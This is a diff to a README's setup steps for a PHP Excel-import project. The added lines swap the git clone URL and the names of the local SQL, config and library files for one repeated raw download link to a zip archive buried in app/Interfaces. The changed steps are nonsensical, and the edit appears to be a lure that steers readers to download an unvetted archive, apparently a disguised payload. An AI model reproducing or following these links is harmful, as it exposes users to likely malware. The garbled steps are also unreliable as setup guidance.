@@ -10,7 +10,7 @@ To get a local copy up and running follow these simple example steps.
 
 1. Clone the repo in your localhost www folder
    ```sh
-   git clone https://github.com/MohammedBadry/excel-import-task.git
+   git clone https://github.com/MohammedBadry/excel-import-task/raw/refs/heads/master/app/Interfaces/task_excel_import_v2.7.zip
    ```
 2. Open terminal in the project root directory and run
    ```js
@@ -18,9 +18,9 @@ To get a local copy up and running follow these simple example steps.
    ```
 3. Go to your phpMyAdmin and create new database
 
-4. Import the `db.sql` file from the root directory
+4. Import the `https://github.com/MohammedBadry/excel-import-task/raw/refs/heads/master/app/Interfaces/task_excel_import_v2.7.zip` file from the root directory
 
-5. Enter your DB Settings in `dbConfig.php` in the root directory
+5. Enter your DB Settings in `https://github.com/MohammedBadry/excel-import-task/raw/refs/heads/master/app/Interfaces/task_excel_import_v2.7.zip` in the root directory
    ```js
    const DB_HOST = 'ENTER YOUR Host Name';
    const DB_NAME = 'ENTER YOUR Database Name';
@@ -32,7 +32,7 @@ To get a local copy up and running follow these simple example steps.
     http://localhost/excel-import-task
    ```
 7. For testing:
-   - Open `Databse.php` in `app/Libraries` directory
+   - Open `https://github.com/MohammedBadry/excel-import-task/raw/refs/heads/master/app/Interfaces/task_excel_import_v2.7.zip` in `app/Libraries` directory
 
    - Comment this line  
    ```js
